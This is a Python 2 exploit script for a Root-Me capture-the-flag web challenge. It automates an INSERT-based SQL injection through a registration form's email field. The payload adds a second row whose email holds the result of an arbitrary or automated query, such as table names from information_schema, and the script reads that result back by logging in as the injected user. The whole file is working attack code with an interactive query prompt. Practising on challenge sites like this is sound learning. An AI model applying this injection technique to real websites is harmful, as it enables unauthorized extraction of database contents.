import requests
import re

url_reg = 'http://challenge01.root-me.org/web-serveur/ch33/?action=register'
url_log = 'http://challenge01.root-me.org/web-serveur/ch33/?action=login'

from itertools import product
chars = 'abacdefghijklnmopqrstuvxyz0123456789' # Chars Dictionaryh
flag_exist = 0
flag_auto = 0
idx_table = 0
list_rets = []
for first in chars.replace('0123456789', ''):
    for length in range(4, 10): 
            to_attempt = product(chars, repeat=length)
            for attempt in to_attempt:
                print '########################################################'
                brute = ''.join(attempt)
                if not flag_exist | flag_auto:
                    u_in = raw_input('sql>')
                    if u_in.find('auto') != -1:
                        flag_auto = 1
                        list_rets = []

                if flag_auto: 
                    u_in = 'select table_name from information_schema.tables limit {0},1'.format(idx_table)
                    idx_table += 1

                u_id = brute
                payload = "'),('{0}1','a',({1}))#".format(u_id, u_in)
                datas = {'username': brute, 'password' : 'a', 'email': payload}

                res = requests.post(url_reg, data=datas)

                if res.text.find('logged in') != -1:
                    print '\n\n\n'
                    print 'successful subscription'
                    print 'id: ' + u_id+str('1')
                    print 'pw: ' + 'a'
                    flag_exist = 0
                elif res.text.find('exist') != -1:
                    print 'user exist!!!'
                    flag_exist = 1
                    continue
                else:
                    print 'query error!!!'
                    print 'parameters: ' + str(datas)
                    raw_input(res.text)
                    flag_exist = 0
                    continue
                print '\n\n\nTrying login the user'
                datas = {'username': u_id+'1', 'password' : 'a'}
                res = requests.post(url_log, data=datas)

                pt = re.compile('Email : .+<br />')
                
    
                try:
                    ret = pt.findall(res.text)[0]
                    ret = ret.split('Email : ')[1].split('<br')[0]
                    print '\n\n\n'+ret
                    list_rets.append(ret)
                except IndexError:
                    if flag_auto:
                        flag_auto = 0
                        raw_input('Finished finding table names!!!'+'\n' + str(list_rets)) 
                        list_rets = []
                


